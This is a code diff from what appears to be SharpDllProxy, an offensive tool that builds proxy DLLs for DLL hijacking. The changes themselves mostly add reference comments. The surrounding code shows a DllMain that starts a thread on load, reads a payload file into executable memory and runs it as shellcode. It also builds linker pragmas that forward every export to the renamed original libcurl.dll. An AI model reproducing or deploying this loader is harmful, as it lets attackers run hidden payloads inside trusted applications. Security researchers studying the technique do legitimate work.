@@ -18,7 +18,7 @@ PRAGMA_COMMENTS
 
 DWORD WINAPI DoMagic(LPVOID lpParameter)
 {
-
+	//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
 	FILE* fp;
 	size_t size;
 	unsigned char* buffer;
@@ -28,7 +28,8 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
         size = ftell(fp);
         fseek(fp, 0, SEEK_SET);
         buffer = (unsigned char*)malloc(size);
-
+	
+	//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
         fread(buffer, size, 1, fp);
 
         void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -50,7 +51,7 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
         switch (ul_reason_for_call)
         {
             case DLL_PROCESS_ATTACH:
-
+		// https://gist.github.com/securitytube/c956348435cc90b8e1f7
                 // Create a thread and close the handle as we do not want to use it to wait for it 
                 threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
                 CloseHandle(threadHandle);
@@ -73,7 +74,6 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
         {
             //Cheesy way to generate a temp filename for our original DLL
             var tempName = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
-
 
             var orgDllPath = @"C:\Users\Flangvik\source\repos\SharpDllProxy\SharpDllProxy\bin\Debug\netcoreapp3.1\libcurl.dll";
 
@@ -117,7 +117,7 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
             //Read PeHeaders -> Exported Functions from provided DLL
             PeNet.PeFile dllPeHeaders = new PeNet.PeFile(orgDllPath);
 
-           //Build up our pragma comments / redirects
+           //Build up our linker redirects
             foreach (var exportedFunc in dllPeHeaders.ExportedFunctions)
             {
                 pragmaBuilder += $"#pragma comment(linker, \"/export:{exportedFunc.Name}={tempName}.{exportedFunc.Name},@{exportedFunc.Ordinal}\")\n";
